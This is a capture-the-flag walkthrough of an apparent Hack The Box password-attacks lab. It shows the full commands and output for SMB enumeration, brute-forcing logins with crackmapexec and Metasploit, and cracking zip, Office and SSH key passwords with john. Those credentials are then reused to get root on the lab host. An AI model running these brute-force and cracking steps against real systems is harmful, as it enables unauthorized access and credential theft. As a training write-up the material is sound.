# Password Attacks Lab - Medium

Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.

## Walkthrough

```bash
nmap -A -T4 10.129.202.221 -oN nmap.txt                
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
139/tcp  open     netbios-ssn Samba smbd 4.6.2
445/tcp  open     netbios-ssn Samba smbd 4.6.2
6129/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| smb2-time: 
|   date: 2024-02-21T18:59:32
|_  start_date: N/A
|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

lets enumerate smb further

```bash
rpcclient -U "" -N 10.129.202.221
#so it means we can anonymous login
enumdomusers
#user:[sam] rid:[0x3e8]
#so we get there is user sam
```

try bruteforcing with crackmapexec

```bash
crackmapexec smb 10.129.202.221 -u username.list -d . -p password.list 
SMB         10.129.202.221  445    SKILLS-MEDIUM    [+] .\john:123456 
```

now lets try brute force with metasploit and the provided wordlists

```bash
#cant use hydra coz its not suport smbv1
msfconsole
use auxiliary/scanner/smb/smb_login
set user_file username.list
set pass_file password.list
set rhosts 10.129.202.221
run
#save to result into smb_login.txt
sed -e 's/.*\\\([^:]*\):\([^ ]*\).*/\1 \2/g; s/'\''$//g' smb_login.txt > result.txt
```

now to split the result&#x20;

```python
# Open the original file for reading
with open("userpass.txt", "r") as original_file:
    # Iterate over each line in the file
    for line in original_file:
        # Split the line into two parts based on space character
        parts = line.strip().split()
        # Check if the line has at least two parts
        if len(parts) >= 2:
            # Write each part to a separate text file
            with open("smb_username.txt", "a") as file1:
                file1.write(parts[0] + "\n")  # Add a newline character after writing
            with open("smb_password.txt", "a") as file2:
                file2.write(parts[1] + "\n")  # Add a newline character after writing
```

now lets check with the shares with smbclient

```bash
smbclient -L //10.129.202.221 -U john%123456
smbclient //10.129.202.221/SHAREDRIVE -U john%123456
ls
#  Docs.zip                            N     6724  Thu Feb 10 05:39:38 2022
get Docs.zip
```

Now try to unzip the docs

```bash
#since the zip is protected, lets try to crack it with john
zip2john Docs.zip > Docs.hash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
john --wordlist=mut_password.list Docs.hash 
#Destiny2022!     (Docs.zip/Documentation.docx)     
unzip Docs.zip
#  inflating: Documentation.docx      
sudo apt install libreoffice -y
libreoffice Documentation.docx 
#its protected and we dont know the password
office2john Documentation.docx > Documentation.hash 
john --wordlist=mut_password.list Documentation.hash
987654321        (Documentation.docx)     
libreoffice Documentation.docx 
#Root password is jason:C4mNKjAtL2dydsYa6
```

lets try ssh with the crendentials jason

```bash
ssh jason@10.129.202.221
sudo -l
#Sorry, user jason may not run sudo on skills-medium.
#from documentation docs, it talk about mysql, lets try to login
mysql -u jason -pC4mNKjAtL2dydsYa6
show databases;
use users;
show tables;
select * from creds;
#| 101 | dennis             |7AUgWWQEiMPdqx|
#dennis is interesting coz different
cat /etc/passwd
#there is user dennis, lets try to to ssh as dennis
ssh dennis@10.129.202.221 
history
#cat id_rsa.pub > authorized_keys
#lets try to decrypt this id_rsa password, most probably this is the root user
scp dennis@10.129.202.221:/home/dennis/.ssh/id_rsa .
ssh2john id_rsa > id_rsa.hash
john --wordlist=mut_password.list id_rsa.hash
#P@ssw0rd12020!   (id_rsa)
ssh -i id_rsa root@10.129.202.221 
whoami #root
cat flag.txt 
HTB{PeopleReuse_PWsEverywhere!}
```
